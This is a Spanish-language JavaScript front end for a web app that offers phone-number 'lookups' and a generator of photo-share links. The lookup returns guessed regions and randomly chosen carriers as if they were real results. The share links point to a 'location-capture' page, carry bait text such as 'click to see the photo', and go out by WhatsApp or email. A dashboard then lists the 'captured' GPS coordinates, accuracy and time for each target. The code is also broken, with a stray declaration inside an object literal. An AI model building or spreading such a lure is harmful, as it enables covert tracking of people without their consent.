// Inicializar Socket.IO
const socket = io();

// Variables globales
let map;
let marker;
let searchHistory = JSON.parse(localStorage.getItem('phoneSearchHistory')) || [];
let stats = { totalSearches: 0, validNumbers: 0 };

// Elementos DOM - Búsqueda de números
const searchForm = document.getElementById('searchForm');
const phoneInput = document.getElementById('phoneInput');
const searchBtn = document.getElementById('searchBtn');
const searchBtnText = document.getElementById('searchBtnText');
const searchBtnLoading = document.getElementById('searchBtnLoading');
const resultsContainer = document.getElementById('resultsContainer');
const noResults = document.getElementById('noResults');
const errorMessage = document.getElementById('errorMessage');
const errorText = document.getElementById('errorText');
const historyList = document.getElementById('historyList');

// Elementos DOM - Pestañas
const phoneTabBtn = document.getElementById('phoneTabBtn');
const linkTabBtn = document.getElementById('linkTabBtn');
const locationsTabBtn = document.getElementById('locationsTabBtn');
const phoneTab = document.getElementById('phoneTab');
const linkTab = document.getElementById('linkTab');
const locationsTab = document.getElementById('locationsTab');

// Elementos DOM - Enlaces con foto
const linkForm = document.getElementById('linkForm');
const photoUrlInput = document.getElementById('photoUrlInput');
const messageInput = document.getElementById('messageInput');
const expirationSelect = document.getElementById('expirationSelect');
const createLinkBtn = document.getElementById('createLinkBtn');
const createLinkBtnText = document.getElementById('createLinkBtnText');
const createLinkBtnLoading = document.getElementById('createLinkBtnLoading');
const linkResultContainer = document.getElementById('linkResultContainer');
const noLinkGenerated = document.getElementById('noLinkGenerated');
const generatedLink = document.getElementById('generatedLink');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const linkId = document.getElementById('linkId');
const linkExpiration = document.getElementById('linkExpiration');
const shareWhatsAppBtn = document.getElementById('shareWhatsAppBtn');
const shareEmailBtn = document.getElementById('shareEmailBtn');

// Elementos DOM - Ubicaciones capturadas
const capturedLocationsContainer = document.getElementById('capturedLocationsContainer');
const loadingLocations = document.getElementById('loadingLocations');
const locationsList = document.getElementById('locationsList');
const noLocations = document.getElementById('noLocations');

// Inicializar aplicación
document.addEventListener('DOMContentLoaded', function() {
    initializeMap();
    loadSearchHistory();
    updateStats();
    
    // Event listeners - Búsqueda de números
    searchForm.addEventListener('submit', handleSearch);
    phoneInput.addEventListener('input', validateInput);
    
    // Event listeners - Pestañas
    phoneTabBtn.addEventListener('click', () => switchTab('phone'));
    linkTabBtn.addEventListener('click', () => switchTab('link'));
    locationsTabBtn.addEventListener('click', () => switchTab('locations'));
    
    // Event listeners - Enlaces con foto
    linkForm.addEventListener('submit', handleCreateLink);
    copyLinkBtn.addEventListener('click', copyToClipboard);
    shareWhatsAppBtn.addEventListener('click', shareViaWhatsApp);
    shareEmailBtn.addEventListener('click', shareViaEmail);
});

// Inicializar mapa
function initializeMap() {
    const mapOptions = {
        zoom: 2,
        center: { lat: 20, lng: 0 },
        styles: [
            {
                "elementType": "geometry",
                "stylers": [{ "color": "#242f3e" }]
            },
            {
                "elementType": "labels.text.stroke",
                "stylers": [{ "color": "#242f3e" }]
            },
            {
                "elementType": "labels.text.fill",
                "stylers": [{ "color": "#746855" }]
            }
        ]
    };
    
    map = new google.maps.Map(document.getElementById('map'), mapOptions);
    document.getElementById('mapPlaceholder').style.display = 'none';
}

// Validar entrada en tiempo real
function validateInput() {
    const value = phoneInput.value.trim();
    const isValid = /^[\+]?[\d\s\-\(\)]{7,15}$/.test(value);
    
    if (value && !isValid) {
        phoneInput.classList.add('border-red-400');
        phoneInput.classList.remove('border-gray-300');
    } else {
        phoneInput.classList.remove('border-red-400');
        phoneInput.classList.add('border-gray-300');
    }
}

// Manejar búsqueda (versión demo)
async function handleSearch(e) {
    e.preventDefault();
    
    const phoneNumber = phoneInput.value.trim();
    if (!phoneNumber) return;
    
    setLoading(true);
    hideError();
    
    // Búsqueda mejorada con más información
    setTimeout(async () => {
        // Detectar país por código
        let country = 'Desconocido';
        let countryCode = 'XX';
        let coordinates = { lat: 0, lng: 0, name: 'Ubicación desconocida' };
        let carrier = 'Desconocido';
        let additionalInfo = '';

        // Intentar obtener información adicional por IP del usuario
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            additionalInfo = `Búsqueda desde: ${ipData.city}, ${ipData.country_name}`;
        } catch (e) {
            additionalInfo = 'Información de búsqueda no disponible';
        }
        
        // Solo Argentina (+54)
        if (phoneNumber.startsWith('+54') || phoneNumber.startsWith('54')) {
            country = 'Argentina';
            countryCode = 'AR';
            
            // Detectar región por código de área
            let region = 'Argentina';
            let regionCoords = { lat: -38.4161, lng: -63.6167 };
            
            if (phoneNumber.includes('11') || phoneNumber.includes('+5411')) {
                region = 'Buenos Aires (CABA)';
                regionCoords = { lat: -34.6118, lng: -58.3960 };
            } else if (phoneNumber.includes('351') || phoneNumber.includes('+54351')) {
                region = 'Córdoba';
                regionCoords = { lat: -31.4201, lng: -64.1888 };
            } else if (phoneNumber.includes('261') || phoneNumber.includes('+54261')) {
                region = 'Mendoza';
                regionCoords = { lat: -32.8908, lng: -68.8272 };
            } else if (phoneNumber.includes('341') || phoneNumber.includes('+54341')) {
                region = 'Rosario';
                regionCoords = { lat: -32.9442, lng: -60.6505 };
            } else if (phoneNumber.includes('221') || phoneNumber.includes('+54221')) {
                region = 'La Plata';
                regionCoords = { lat: -34.9215, lng: -57.9545 };
            } else if (phoneNumber.includes('381') || phoneNumber.includes('+54381')) {
                region = 'Tucumán';
                regionCoords = { lat: -26.8083, lng: -65.2176 };
            }
            
            coordinates = { ...regionCoords, name: region };
            
            // Operadoras argentinas más específicas
            const carriers = ['Claro Argentina', 'Movistar Argentina', 'Personal', 'Tuenti Argentina'];
            carrier = carriers[Math.floor(Math.random() * carriers.length)];
        } else {
            // Número no argentino
            country = 'No es número argentino';
            countryCode = 'XX';
            coordinates = { lat: 0, lng: 0, name: 'Solo números argentinos (+54)' };
            carrier = 'N/A';
        }
        
        const demoData = {
            valid: true,
            number: phoneNumber,
            country: country,
            countryCode: countryCode,
            carrier: carrier,
            lineType: 'Móvil',
            coordinates: coordinates,
            timestamp: new Date().toISOString(),
            disclaimer: 'Esta es una demostración. En producción se usarían APIs reales.'
        };
        
        displayResults(demoData);
        addToHistory(phoneNumber, demoData);
        updateMapLocation(demoData.coordinates);
        stats.validNumbers++;
        stats.totalSearches++;
        updateStats();
        setLoading(false);
    }, 1500);
}

// Mostrar resultados
function displayResults(data) {
    document.getElementById('resultNumber').textContent = data.number || 'No disponible';
    document.getElementById('resultCountry').textContent = data.country || 'No disponible';
    document.getElementById('resultCarrier').textContent = data.carrier || 'No disponible';
    document.getElementById('resultLineType').textContent = data.lineType || 'No disponible';
    document.getElementById('resultDisclaimer').textContent = data.disclaimer || '';
    
    resultsContainer.classList.remove('hidden');
    noResults.style.display = 'none';
    
    // Animación de entrada
    resultsContainer.style.opacity = '0';
    resultsContainer.style.transform = 'translateY(20px)';
    setTimeout(() => {
        resultsContainer.style.transition = 'all 0.3s ease';
        resultsContainer.style.opacity = '1';
        resultsContainer.style.transform = 'translateY(0)';
    }, 100);
}

// Actualizar ubicación en el mapa
function updateMapLocation(coordinates) {
    if (!map || !coordinates.lat || !coordinates.lng) return;
    
    const position = { lat: coordinates.lat, lng: coordinates.lng };
    
    // Remover marcador anterior
    if (marker) {
        marker.setMap(null);
    }
    
    // Crear nuevo marcador
    marker = new google.maps.Marker({
        position: position,
        map: map,
        title: coordinates.name || 'Ubicación aproximada',
        animation: google.maps.Animation.DROP,
        icon: {
            url: 'data:image/svg+xml;charset=UTF-8,' + encodeURIComponent(`
                <svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="20" cy="20" r="15" fill="#3B82F6" stroke="#FFFFFF" stroke-width="3"/>
                    <circle cx="20" cy="20" r="8" fill="#FFFFFF"/>
                </svg>
            `),
            scaledSize: new google.maps.Size(40, 40)
        }
    });
    
    // Centrar mapa
    map.setCenter(position);
    map.setZoom(6);
    
    // Agregar círculo de área aproximada
    const circle = new google.maps.Circle({
        strokeColor: '#3B82F6',
        strokeOpacity: 0.8,
        strokeWeight: 2,
        fillColor: '#3B82F6',
        fillOpacity: 0.15,
        map: map,
        center: position,
        radius: 100000 // 100km radius
    });
}

// Agregar al historial
function addToHistory(phoneNumber, data) {
    const historyItem = {
        phone: phoneNumber,
        country: data.country,
        timestamp: new Date().toLocaleString(),
        id: Date.now()
    };
    
    searchHistory.unshift(historyItem);
    searchHistory = searchHistory.slice(0, 10); // Mantener solo 10 elementos
    
    localStorage.setItem('phoneSearchHistory', JSON.stringify(searchHistory));
    loadSearchHistory();
}

// Cargar historial de búsquedas
function loadSearchHistory() {
    if (searchHistory.length === 0) {
        historyList.innerHTML = '<p class="text-gray-300 text-sm">No hay búsquedas recientes</p>';
        return;
    }
    
    historyList.innerHTML = searchHistory.map(item => `
        <div class="bg-white bg-opacity-10 rounded-lg p-3 cursor-pointer hover:bg-opacity-20 transition-all"
             onclick="searchFromHistory('${item.phone}')">
            <div class="flex justify-between items-center">
                <div>
                    <p class="text-white text-sm font-medium">${item.phone}</p>
                    <p class="text-gray-300 text-xs">${item.country}</p>
                </div>
                <p class="text-gray-400 text-xs">${item.timestamp}</p>
            </div>
        </div>
    `).join('');
}

// Buscar desde historial
function searchFromHistory(phoneNumber) {
    phoneInput.value = phoneNumber;
    handleSearch({ preventDefault: () => {} });
}

// Mostrar/ocultar estado de carga
function setLoading(loading) {
    if (loading) {
        searchBtnText.classList.add('hidden');
        searchBtnLoading.classList.remove('hidden');
        searchBtn.disabled = true;
    } else {
        searchBtnText.classList.remove('hidden');
        searchBtnLoading.classList.add('hidden');
        searchBtn.disabled = false;
    }
}

// Mostrar error
function showError(message) {
    errorText.textContent = message;
    errorMessage.classList.remove('hidden');
    resultsContainer.classList.add('hidden');
    noResults.style.display = 'block';
}

// Ocultar error
function hideError() {
    errorMessage.classList.add('hidden');
}

// Actualizar estadísticas
function updateStats() {
    document.getElementById('totalSearches').textContent = stats.totalSearches;
    document.getElementById('validNumbers').textContent = stats.validNumbers;
}

// Socket.IO eventos
socket.on('connect', () => {
    document.getElementById('connectionStatus').innerHTML = `
        <div class="w-3 h-3 bg-green-400 rounded-full pulse-animation"></div>
        <span class="text-white text-sm ml-2">Conectado</span>
    `;
});

socket.on('disconnect', () => {
    document.getElementById('connectionStatus').innerHTML = `
        <div class="w-3 h-3 bg-red-400 rounded-full"></div>
        <span class="text-white text-sm ml-2">Desconectado</span>
    `;
});

socket.on('phoneUpdate', (data) => {
    // Mostrar notificación de nueva búsqueda en tiempo real
    showRealtimeNotification(data);
});

// Mostrar notificación en tiempo real
function showRealtimeNotification(data) {
    const notification = document.createElement('div');
    notification.className = 'fixed top-4 right-4 bg-blue-500 text-white p-4 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300';
    notification.innerHTML = `
        <div class="flex items-center">
            <i class="fas fa-bell mr-2"></i>
            <div>
                <p class="font-medium">Nueva búsqueda</p>
                <p class="text-sm opacity-90">${data.country || 'País desconocido'}</p>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Animar entrada
    setTimeout(() => {
        notification.style.transform = 'translateX(0)';
    }, 100);
    
    // Remover después de 3 segundos
    setTimeout(() => {
        notification.style.transform = 'translateX(full)';
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 3000);
}

// Formatear número de teléfono mientras se escribe
phoneInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 0 && !value.startsWith('+')) {
        value = '+' + value;
    }
    e.target.value = value;
});

// === FUNCIONES PARA PESTAÑAS ===

// Cambiar entre pestañas
function switchTab(tabName) {
    // Actualizar botones
    [phoneTabBtn, linkTabBtn, locationsTabBtn].forEach(btn => {
        btn.classList.remove('bg-gradient-to-r', 'from-blue-500', 'to-purple-600');
        btn.classList.add('hover:bg-white', 'hover:bg-opacity-10');
    });
    
    // Ocultar todas las pestañas
    [phoneTab, linkTab, locationsTab].forEach(tab => {
        tab.classList.add('hidden');
    });
    
    // Mostrar pestaña seleccionada y activar botón
    switch(tabName) {
        case 'phone':
            phoneTab.classList.remove('hidden');
            phoneTabBtn.classList.add('bg-gradient-to-r', 'from-blue-500', 'to-purple-600');
            phoneTabBtn.classList.remove('hover:bg-white', 'hover:bg-opacity-10');
            break;
        case 'link':
            linkTab.classList.remove('hidden');
            linkTabBtn.classList.add('bg-gradient-to-r', 'from-blue-500', 'to-purple-600');
            linkTabBtn.classList.remove('hover:bg-white', 'hover:bg-opacity-10');
            break;
        case 'locations':
            locationsTab.classList.remove('hidden');
            locationsTabBtn.classList.add('bg-gradient-to-r', 'from-blue-500', 'to-purple-600');
            locationsTabBtn.classList.remove('hover:bg-white', 'hover:bg-opacity-10');
            loadCapturedLocations();
            break;
    }
}

// === FUNCIONES PARA ENLACES CON FOTO ===

// Crear enlace con foto (versión demo)
async function handleCreateLink(e) {
    e.preventDefault();
    
    const photoUrl = photoUrlInput.value.trim();
    const message = messageInput.value.trim();
    
    if (!photoUrl) return;
    
    setLinkLoading(true);
    
    // Simular creación de enlace para demo
    setTimeout(() => {
        const linkId = Math.random().toString(36).substr(2, 9);
        const demoData = {
            success: true,
            linkId: linkId,
            const shareUrl = `${window.location.origin}/location-capture.html?id=${linkId}`;
            expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
        };
        
        // Guardar en localStorage para demo
        localStorage.setItem(`link_${linkId}`, JSON.stringify({
            photoUrl,
            message: message || 'Haz clic para ver la foto',
            createdAt: Date.now()
        }));
        
        displayGeneratedLink(demoData);
        setLinkLoading(false);
    }, 1000);
}

// Mostrar enlace generado
function displayGeneratedLink(data) {
    generatedLink.value = data.shareUrl;
    linkId.textContent = data.linkId;
    linkExpiration.textContent = new Date(data.expiresAt).toLocaleString();
    
    linkResultContainer.classList.remove('hidden');
    noLinkGenerated.style.display = 'none';
}

// Copiar enlace al portapapeles
async function copyToClipboard() {
    try {
        await navigator.clipboard.writeText(generatedLink.value);
        
        // Cambiar icono temporalmente
        const icon = copyLinkBtn.querySelector('i');
        icon.className = 'fas fa-check';
        copyLinkBtn.classList.add('bg-green-500');
        
        setTimeout(() => {
            icon.className = 'fas fa-copy';
            copyLinkBtn.classList.remove('bg-green-500');
        }, 2000);
        
    } catch (error) {
        console.error('Error copiando al portapapeles:', error);
        // Fallback para navegadores que no soportan clipboard API
        generatedLink.select();
        document.execCommand('copy');
    }
}

// Compartir via WhatsApp
function shareViaWhatsApp() {
    const message = `${messageInput.value || 'Mira esta foto'}: ${generatedLink.value}`;
    const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
    window.open(whatsappUrl, '_blank');
}

// Compartir via Email
function shareViaEmail() {
    const subject = encodeURIComponent('Foto compartida');
    const body = encodeURIComponent(`${messageInput.value || 'Hola, te comparto esta foto'}:\n\n${generatedLink.value}`);
    const emailUrl = `mailto:?subject=${subject}&body=${body}`;
    window.open(emailUrl);
}

// Mostrar/ocultar estado de carga para enlaces
function setLinkLoading(loading) {
    if (loading) {
        createLinkBtnText.classList.add('hidden');
        createLinkBtnLoading.classList.remove('hidden');
        createLinkBtn.disabled = true;
    } else {
        createLinkBtnText.classList.remove('hidden');
        createLinkBtnLoading.classList.add('hidden');
        createLinkBtn.disabled = false;
    }
}

// === FUNCIONES PARA UBICACIONES CAPTURADAS ===

// Cargar ubicaciones capturadas (versión demo)
async function loadCapturedLocations() {
    try {
        loadingLocations.classList.remove('hidden');
        locationsList.classList.add('hidden');
        noLocations.classList.add('hidden');
        
        // Cargar desde localStorage para demo
        const capturedLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
        
        if (capturedLocations.length === 0) {
            noLocations.classList.remove('hidden');
        } else {
            displayCapturedLocations(capturedLocations.map(loc => ({
                linkId: loc.linkId,
                linkData: loc.linkData,
                location: loc
            })));
            locationsList.classList.remove('hidden');
        }
        
    } catch (error) {
        console.error('Error cargando ubicaciones:', error);
        noLocations.classList.remove('hidden');
    } finally {
        loadingLocations.classList.add('hidden');
    }
}

// Mostrar ubicaciones capturadas
function displayCapturedLocations(locations) {
    locationsList.innerHTML = locations.map(item => `
        <div class="bg-white bg-opacity-10 rounded-lg p-4">
            <div class="flex items-start justify-between mb-3">
                <div class="flex items-center space-x-3">
                    <img src="${item.linkData.photoUrl}" alt="Foto" class="w-12 h-12 rounded-lg object-cover">
                    <div>
                        <p class="text-white font-medium">${item.linkData.message}</p>
                        <p class="text-gray-300 text-sm">ID: ${item.linkId}</p>
                    </div>
                </div>
                <span class="bg-green-500 text-white px-2 py-1 rounded text-xs">
                    <i class="fas fa-map-marker-alt mr-1"></i>
                    Capturada
                </span>
            </div>
            
            <div class="grid grid-cols-2 gap-4 text-sm">
                <div>
                    <p class="text-gray-400">Latitud:</p>
                    <p class="text-white font-mono">${item.location.latitude.toFixed(6)}</p>
                </div>
                <div>
                    <p class="text-gray-400">Longitud:</p>
                    <p class="text-white font-mono">${item.location.longitude.toFixed(6)}</p>
                </div>
                <div>
                    <p class="text-gray-400">Precisión:</p>
                    <p class="text-white">${Math.round(item.location.accuracy)}m</p>
                </div>
                <div>
                    <p class="text-gray-400">Capturada:</p>
                    <p class="text-white">${new Date(item.location.capturedAt).toLocaleString()}</p>
                </div>
            </div>
            
            <div class="mt-3 flex space-x-2">
                <button 
                    onclick="viewLocationOnMap(${item.location.latitude}, ${item.location.longitude})"
                    class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-sm transition-all"
                >
                    <i class="fas fa-map mr-1"></i>
                    Ver en Mapa
                </button>
                <button 
                    onclick="openGoogleMaps(${item.location.latitude}, ${item.location.longitude})"
                    class="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-sm transition-all"
                >
                    <i class="fab fa-google mr-1"></i>
                    Google Maps
                </button>
            </div>
        </div>
    `).join('');
}

// Ver ubicación en el mapa local
function viewLocationOnMap(lat, lng) {
    switchTab('phone'); // Cambiar a la pestaña del mapa
    
    const position = { lat, lng };
    
    // Remover marcador anterior
    if (marker) {
        marker.setMap(null);
    }
    
    // Crear nuevo marcador
    marker = new google.maps.Marker({
        position: position,
        map: map,
        title: 'Ubicación capturada',
        animation: google.maps.Animation.DROP,
        icon: {
            url: 'data:image/svg+xml;charset=UTF-8,' + encodeURIComponent(`
                <svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="20" cy="20" r="15" fill="#EF4444" stroke="#FFFFFF" stroke-width="3"/>
                    <circle cx="20" cy="20" r="8" fill="#FFFFFF"/>
                </svg>
            `),
            scaledSize: new google.maps.Size(40, 40)
        }
    });
    
    // Centrar mapa
    map.setCenter(position);
    map.setZoom(15);
}

// Abrir en Google Maps
function openGoogleMaps(lat, lng) {
    const url = `https://www.google.com/maps?q=${lat},${lng}`;
    window.open(url, '_blank');
}

// Socket.IO eventos para ubicaciones
socket.on('locationCaptured', (data) => {
    // Mostrar notificación de nueva ubicación capturada
    showLocationNotification(data);
    
    // Si estamos en la pestaña de ubicaciones, recargar
    if (!locationsTab.classList.contains('hidden')) {
        loadCapturedLocations();
    }
});

// Mostrar notificación de ubicación capturada
function showLocationNotification(data) {
    const notification = document.createElement('div');
    notification.className = 'fixed top-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300';
    notification.innerHTML = `
        <div class="flex items-center">
            <i class="fas fa-map-marker-alt mr-2"></i>
            <div>
                <p class="font-medium">📍 Nueva ubicación capturada</p>
                <p class="text-sm opacity-90">Lat: ${data.location.latitude.toFixed(4)}, Lng: ${data.location.longitude.toFixed(4)}</p>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Animar entrada
    setTimeout(() => {
        notification.style.transform = 'translateX(0)';
    }, 100);
    
    // Remover después de 5 segundos
    setTimeout(() => {
        notification.style.transform = 'translateX(full)';
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 5000);
}

// Limpiar formulario con Escape
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        phoneInput.value = '';
        phoneInput.focus();
        hideError();
    }
});
